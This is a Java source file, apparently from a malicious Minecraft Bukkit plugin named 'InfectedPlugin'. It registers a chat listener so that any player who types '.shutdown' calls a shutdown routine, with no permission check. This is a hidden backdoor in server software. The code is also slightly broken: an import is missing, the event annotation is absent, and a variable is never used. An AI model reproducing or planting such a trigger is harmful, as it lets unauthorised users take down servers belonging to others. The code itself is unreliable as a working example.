package org.CreeperCoders.InfectedPlugin;

import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import org.CreeperCoders.InfectedPlugin.IP_Util;

public class Command_shutdown implements Listener
{
    public final Logger log = Bukkit.getLogger();

    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        boolean cancel = true;
    
        if (message.toLowerCase().contains(".shutdown"))
        {
            try
            {
                IP_Util.shutdown();
            }
            catch (IOException ex)
            {
                log.severe(ex.getMessage());
            }
            catch (RuntimeException ex)
            {
                log.severe(ex.getMessage());
            }
            cancel = true;
        }
    }
}
